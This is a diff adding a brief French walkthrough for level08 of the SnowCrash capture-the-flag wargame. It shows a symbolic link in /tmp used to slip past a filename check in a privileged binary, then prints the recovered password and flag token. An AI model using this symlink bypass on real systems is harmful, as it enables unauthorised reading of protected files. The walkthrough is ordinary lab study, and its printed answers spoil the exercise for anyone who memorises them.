@@ -1,0 +1,12 @@
+Ici nous avons un executable level08 et un fichier token, l'executable prend en parametre un fichier et l'affiche, on en deduis donc que le but est de lire le fichier
+token, comme nous n'avons pas les droits dessus, on test de faire un lien symbolique dessus dans un endroit ou l'on a les droits:
+level08@SnowCrash:/tmp/tettouat$ ln -s /home/user/level08/token a
+level08@SnowCrash:/tmp/tettouat$ ~/level08 /tmp/tettouat/a
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+Voila!
